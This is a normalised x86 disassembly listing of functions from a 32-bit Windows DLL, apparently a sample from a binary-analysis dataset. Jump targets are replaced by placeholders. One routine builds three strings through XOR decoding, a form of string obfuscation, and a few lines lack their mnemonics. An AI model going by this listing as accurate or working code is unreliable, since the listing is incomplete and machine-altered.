jl r-xdata
jl r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_1003db31
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_10060405
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_10063a9a
pop ecx
push eax
call sub_1000a957
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_10063a9a
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_10063a9a
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_10063a9a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10063a9a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1003dc60
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff99
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x14 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffda
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x9
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x2a ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f580
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f580
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f580
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f580
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x3c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f580
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1003de00
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
xor edi edi
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x14 ] edi
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
add edx 0x8
push edx
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
sub ecx esi
push ecx
lea edx [ ebp + 0x8 ]
push esi
push edx
call sub_10025a12
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
inc edi
add esi eax
cmp edi [ ebp + 0x14 ]
jb r-xdata
xor eax eax
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_1003de90
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] edx
call sub_100065a0
add esp 0x4
test eax eax
mov eax 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
call sub_10072130
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x20c ]
push 0x0
push ecx
call sub_1007f8f0
lea edx [ ebp - 0x210 ]
push edx
call sub_10026420
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_10072780
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x210 ]
push edx
call sub_10026420
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10050c60
test eax eax
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10050c60
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x21c ]
lea edx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x218 ]
push eax
call sub_10028870
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x4
pop ebx
sub_1003e070
push ebp
mov ebp esp
push 0xffffffff
push sub_10086858
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov [ ebp - 0x38 ] eax
mov eax [ esi ]
push 0x1
push eax
lea ecx [ ebp - 0x30 ]
push ecx
mov ecx edi
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] 0x3b
call sub_100198e0
mov [ ebx ] eax
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov [ ebp - 0x30 ] 0x3b
jmp r-xdata
mov ecx [ esi ]
mov eax [ ebx ]
sub eax ecx
push eax
push ecx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_10037cf0
mov edi [ ebp - 0x38 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_1002c3f0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebx ]
inc eax
push 0x1
push eax
lea ecx [ ebp - 0x30 ]
push ecx
mov ecx [ ebp - 0x34 ]
mov [ esi ] eax
call sub_100198e0
mov [ ebx ] eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
mov edi [ ebp - 0x34 ]
sub_1003e150
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
xor eax eax
test edx edx
je r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov ecx edi
lea esp [ esp ]
cmp eax 0xffffffff
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
pop edi
pop ebx
lea ecx [ edi + eax * 4 ]
sub edx eax
lea eax [ edx * 4 - 0x4 ]
push eax
lea edx [ ecx + 0x4 ]
push edx
push ecx
call sub_1007ec40
add esp 0xc
dec [ esi + 0x4 ]
cmp [ ecx ] ebx
je r-xdata
pop edi
pop ebx
pop esi
pop ebp
retn
sub_1003e1c0
push ecx
push rw-data
call sub_1000d280
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_1003e200
push ebp
mov ebp esp
sub esp 0x8
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push ebx
push esi
lea esi [ edx + 0xc ]
push edi
mov edi [ edx + 0x8 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea ebx [ ebp - 0x8 ]
cmp ecx ebx
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_10045880
mov edx [ rw-data ]
mov edi ebx
sub edi ecx
sar edi 0x3
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x8
mov eax [ edx + 0x8 ]
pop edi
lea ecx [ eax + 0x1 ]
pop esi
mov [ edx + 0x8 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_10045880
mov edx [ rw-data ]
mov ecx [ esi ]
mov ebx [ ecx + edi * 8 ]
mov [ eax ] ebx
mov ecx [ ecx + edi * 8 + 0x4 ]
jmp r-xdata
mov [ eax + 0x4 ] ecx
sub_1003e2b0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ edx + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
mov eax edx
mov eax [ edx ]
jmp r-xdata
mov edx [ edx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
add edx eax
push edx
push eax
push esi
call sub_1005cdf0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_1003e2e4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_1003e323
push 0x14
push r--data
call sub_1007fad0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1007fb15
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1005fd8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10049f3a
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003e403
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1003e410
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
push r--data
call sub_10030594
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_10071bf0
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
push edi
push 0x0
mov ecx esi
call sub_1006de60
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003e4b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088de7
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x144
xor ebx ebx
push ebx
mov edi ecx
mov [ ebp - 0xf0 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
mov eax [ edi + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0xe8 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0xec ]
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xe8 ] ebx
call sub_100310b0
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0xec ]
cmp esi ebx
jne r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
mov eax 0x1
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
call sub_10056b00
mov edi eax
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xe5
call sub_10069020
xor ecx ecx
mov eax edx
mov [ ebp - 0xb4 ] 0x7
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] cx
lea edx [ eax + 0x2 ]
lea ecx [ eax + eax ]
push esi
call sub_1000d0d0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ ebp - 0xf0 ]
lea ecx [ esi + 0x13c ]
call sub_1002db40
lea eax [ ebp - 0xec ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
xor eax eax
lea edx [ ebp - 0xac ]
mov eax 0xa2
call sub_10069020
lea ecx [ ebp - 0xe4 ]
push edi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x3
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x11
mov [ ebp - 0x4 ] 0x4
call sub_10022b50
mov edi 0x8
cmp [ ebp - 0xb4 ] edi
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x4c ]
push edx
lea ecx [ ebp - 0xc8 ]
call sub_10034100
lea edx [ ebp - 0xc8 ]
mov ecx 0x11
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
cmp [ ebp - 0xb4 ] 0x8
jb r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
xor eax eax
mov esi 0x7
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] ax
cmp [ ebp - 0xd0 ] edi
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0xe8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp - 0xc8 ]
push eax
call sub_1000a86e
add esp 0x4
xor edx edx
lea eax [ ebp - 0xec ]
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xe4 ] dx
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1003e780
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_10045c60
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_10037cf0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_10037cf0
pop esi
pop ebx
pop ebp
retn 0x8
sub_1003e875
push 0x4
mov eax sub_10085119
call sub_10026266
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_10008d33
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_1000c927
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
push 0x20
call sub_1002e3ac
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_1000337d
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_10024880
mov ecx esi
mov [ rw-data ] esi
call sub_10042890
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_10004247
mov esi eax
sub_1003e904
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_1004b131
mov eax esi
jmp r-xdata
sub_1003e971
push 0x4c
mov eax sub_10085809
call sub_10047689
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_100262c3
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1000985a
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10025720
push eax
lea ecx [ ebp - 0x58 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10021806
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_1003ea28
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10054390
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x18
sub_1003eaa0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10032529
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
push 0x1
push eax
call sub_100074b0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
mov eax 0x2
call sub_10072130
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_1007f8f0
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10026420
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_10072780
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10026420
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
